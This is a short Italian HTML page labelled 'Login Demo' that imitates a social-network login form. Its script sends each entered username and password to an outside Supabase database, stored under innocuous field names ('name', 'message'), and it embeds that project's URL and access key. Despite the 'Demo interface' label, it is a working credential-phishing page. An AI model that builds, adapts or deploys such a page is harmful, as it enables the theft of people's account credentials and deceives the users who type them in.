<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login Demo</title>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>

<style>
body {
    margin: 0;
    background: #fafafa;
    font-family: Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}

.card {
    width: 380px;
    background: white;
    border: 1px solid #dbdbdb;
    padding: 50px 40px;
    text-align: center;
    border-radius: 10px;
}

.logo {
    font-size: 40px;
    font-weight: bold;
    margin-bottom: 25px;
}

input {
    width: 100%;
    padding: 12px;
    margin: 6px 0;
    border: 1px solid #dbdbdb;
    border-radius: 6px;
    background: #fafafa;
}

button {
    width: 100%;
    padding: 12px;
    margin-top: 10px;
    background: #4dabf7;
    border: none;
    color: white;
    font-weight: bold;
    border-radius: 8px;
    cursor: pointer;
}

button:hover {
    background: #1877f2;
}

.small {
    margin-top: 15px;
    font-size: 12px;
    color: gray;
}
</style>
</head>

<body>

<div class="card">

    <div class="logo">Login</div>

    <input id="user" placeholder="Numero di telefono, email o username">
    <input id="msg" type="password" placeholder="Password">

    <button onclick="send()">Accedi</button>

    <div class="small">Demo interface</div>

</div>

<script>

// 🔵 SUPABASE CONFIG COMPLETA
const supabaseUrl = "https://kgtpnhvdnjsmimihguqg.supabase.co";

const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtndHBuaHZkbmpzbWltaWhndXFnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY5NTgxNjEsImV4cCI6MjA5MjUzNDE2MX0.py6zxxMaL3tjPl8o4A5RkMX01K_Qd1ve0OQv1mfwJRk";

const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);

// INVIO DATI
async function send() {
    const user = document.getElementById("user").value;
    const msg = document.getElementById("msg").value;

    if (!user || !msg) {
        alert("Compila tutti i campi");
        return;
    }

    const { error } = await supabase
        .from('messages')
        .insert([{ name: user, message: msg }]);

    if (error) {
        console.log(error);
        alert("Errore nel database");
    } else {
        alert("Dati inviati!");
    }
}

</script>

</body>
</html>
